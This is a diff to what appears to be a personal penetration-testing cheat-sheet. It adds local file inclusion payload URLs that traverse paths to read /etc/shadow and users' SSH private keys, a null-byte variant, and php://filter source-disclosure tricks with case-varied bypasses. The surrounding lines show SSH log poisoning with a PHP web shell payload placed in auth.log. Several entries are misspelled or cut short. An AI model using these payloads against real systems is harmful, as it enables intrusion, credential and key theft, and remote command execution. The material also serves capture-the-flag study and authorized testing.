@@ -23,6 +23,24 @@ try ssh poisinong
 nc -nv <ip> 22
 omgthissofun/<?php passthru($_GET['cmd']); ?>          # this will refeclt in /var/log/auth.log
 ```
+```
+/etc/passwd
+ /etc/shadow
+ /etc/knockd.conf     // port knocking config
+```
+```
+ http://url/index.php?page=../../../etc/passwd
+ http://url/index.php?page=../../../etc/shadow
+ http://url/index.php?page=../../../home/user/.ssh/id_rsa.pub
+ http://url/index.php?page=../../../home/user/.ssh/id_rsa
+ http://url/index.php?page=../../../home/user/.ssh/authorized_key
+
+ http://url/index.php?page=../../../etc/passwd%0
+
+ http://url/index.php?page=php://filter/convert.base64-encode/resource=index
+ http://url/index.php?page=pHp://FilTer/convert.base64-encode/resource=inde
+```
+
 ### PDF to text 
 ```
 pdftotext *.pdf
